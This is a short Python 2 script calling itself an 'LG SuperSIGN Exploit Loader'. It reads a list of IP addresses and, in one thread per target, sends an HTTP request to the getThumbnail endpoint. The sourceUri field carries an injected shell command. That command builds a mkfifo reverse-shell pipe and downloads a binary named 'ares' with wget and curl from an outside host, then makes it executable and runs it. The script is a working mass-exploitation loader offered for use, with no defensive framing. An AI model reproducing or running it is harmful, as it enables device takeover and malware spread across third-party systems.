#! python !#
# -*- coding: utf-8 -*- 
#LG SuperSIGN Exploit Loader made by B4CKDOOR#
#REQUESTS ERROR: yum install python-requests#
import threading, sys, time, random, socket, re, os, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *	

if len(sys.argv) < 3:
	print "\033[37mUsage: python "+sys.argv[0]+" <list> <port>\033[37m"
	sys.exit()
#USAGE: python b4ck_lg.py vuln.txt 9080 | python b4ck_lg.py vuln list 9080
ips = open(sys.argv[1], "r").readlines()
port = int(sys.argv[2]) # ports  9080 	
class b4ckdoor(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print "\x1b[1;31m[\x1b[1;37mSuperSign\x1b[1;31m]\x1b[1;37m Xploiting\x1b[1;31m[\x1b[1;36m\x1b[1;31m]" + self.ip
				url = "http://" + self.ip + ":"+port+"/qsr_server/device/getThumbnail?sourceUri=\'%20-;rm%2B%2Ftmp%2Ff%3Bmkfifo%2B%2Ftmp%2Ff%3Bcat%2B%2Ftmp%2Ff%2B%7C%2B%2Fbin%2Fsh%2B-i%2B2%3E%261%2B%7C%2B%3Bwget%20http%3A%2F%2F1.1.1.1%2Fares%3B%20curl%20-O%20http%3A%2F%2F1.1.1.1%2Fares%3B%20chmod%20777%20ares%3B%20sh%20ares;\'&targetUri=%2Ftmp%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150"
              
				requests.get(url, timeout=4) 

			except Exception as e:
				pass
for ip in ips:
	try:
		n = b4ckdoor(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass#CODED BY B4CKDOOR